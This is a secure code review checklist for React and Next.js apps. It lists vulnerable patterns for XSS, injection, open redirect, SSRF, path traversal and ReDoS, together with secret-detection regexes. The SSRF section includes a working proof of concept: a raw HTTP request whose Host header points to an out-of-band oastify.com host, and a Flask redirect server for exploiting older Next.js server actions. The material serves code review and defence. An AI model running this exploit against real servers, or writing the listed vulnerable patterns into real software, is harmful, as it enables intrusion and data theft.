# React/Next.js Secure Code Review Checklist

## XSS

```
<div dangerouslySetInnerHTML={{ __html: text }} />;
```

```
<a href={user_input}>Click here!</a>
```

```
this.myRef.current.innerHTML = userInput;
```

```
<button form="name" formaction={user_input}>
```

```
React.createElement("a", {
  href: user_input
})
```

```
<a onClick={userinput}>
<span onClick={userinput}>
```

```
this.myRef.insertAdjacentHTML('afterend', user_input);
```

```
// Reflected XSS
function renderFullPage(html, preloadedState) {
  return `
        <div id="root">${html}</div>
        <script>
          window.__PRELOADED_STATE__ = ${JSON.stringify(preloadedState)}
        </script>
    `
}
```

```
// Dangerously Allow SVG without proper CSP 
module.exports = {
  images: {
    dangerouslyAllowSVG: true,
    contentSecurityPolicy: "",
  },
}
```


## Code Injection

```
useEffect(() => {
    import(`./${componentName}`)
      .then(setComponent)
      .catch(console.error);
  }, [componentName]);
```

```
import(`../../locales/${user_input}`)
```

## Open Redirect

```
const [redirectTo, setRedirectTo] = useState('');

const login = async () => {
  await doSomething();
  window.location.href = redirectTo;
};
```

```
window.document.location = user_input
```

## SSRF

```
await axios({
    method: 'post',
    url: `${user_input}/foo`,
  });

```

```
const response = await fetch(`${user_input}/api/token=1212121233`, {
  });
```

```
request.get(`${user_input}/redirect=${user_input2}`)
```

Next.Js `Image` configuration can be abused to cause Blind SSRF.

```
 images: {
    remotePatterns: [
		{
			protocol: "https",
			hostname: "**",
		},
		{
			protocol: "http",
			hostname: "**",
		},
    ],
  },
```
Above is an insecure remote patterns. Can also cause XSS with CDN domains as well if `dangerouslyAllowSVG` is set to `true`

#### Server actions in older Next.js (`<v14.1.1.`) is vulnerable to SSRF since the host header is read from client.
Vulnerable if server action is used, has a redirect to `/` and the `host` header can be tampared.

Vulnerable code example:

```
"use server";

import { redirect } from "next/navigation";

export const handleSearch = async (data: FormData) => {
  if (!userIsLoggedIn()) {
    redirect("/login");
    return;
  }
  // .. do other stuff ..
};

function userIsLoggedIn() {
  return false;
}
```

PoC:
```
POST /x HTTP/1.1
Host: kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
Content-Length: 4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
Next-Action: 15531bfa07ff11369239544516d26edbc537ff9c
Connection: close

{}
```

The `Next-Action` header denotes that a next action is used. The above blind SSRF can be turned into a reqular SSRF with a middleware server.

```
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('https://example.com')

```

Change the Host header to the flask server and set your target SSRF URL inside the flask server.

How this works?
- The Next.js server first does a preflight HEAD request to the URL.
- If the preflight returns a Content-Type header of RSC_CONTENT_TYPE_HEADER, which is text/x-component, then NextJS makes a GET request to the same URL.
- The content of that GET request is then returned in the response.


## Sensitive Data Exposure Next.js

```
// Not suitable for server side secrets
publicRuntimeConfig: {
		AWS_API: process.env.AWS_API,
    GITHUB_TOKEN: process.env.GITHUB_TOKEN ,
	}
```

```
// Expose source map in production, source code leakage.
productionBrowserSourceMaps: true,
```

## Lack of Origin Validation

```
.postMessage(data, '*')
```

## Path Traversal

```
path.join('/tmp', user_input)
path.resolve('/tmp', user_input)
```

## ReDoS

```
new RegExp(user_input_or_insecure)
```

Check all regex with [https://github.com/makenowjust-labs/recheck](https://makenowjust-labs.github.io/recheck/playground/)

## CSRF

Mostly single page, check if origin is validated or a token is used.

## Regex Search

- API Keys: `[aA][pP][iI]_?[kK][eE][yY][=_:\\s-]+['|\"]?[0-9a-zA-Z]{32,45}['|\"]?`
- Secret Tokens: `(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?`
- Hardcoded Auth token `Bearer ([a-z]|[0-9])+? `
- Hardcoded JWT: `eyJhb.*`
- Hardcoded Private Key: `-----END RSA PRIVATE KEY-----`
- Github Token: `(ghp_)[\S]{36}`

## Semgrep

```
semgrep --config auto .
semgrep --config "p/typescript" .
```

### References:

- https://www.hyper-leap.com/2023/08/06/react-security-vulnerabilities-and-how-to-fix-them/
- https://snyk.io/blog/10-react-security-best-practices/
- https://redux.js.org/usage/server-rendering#security-considerations
- https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json
- https://medium.com/dailyjs/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1
- https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
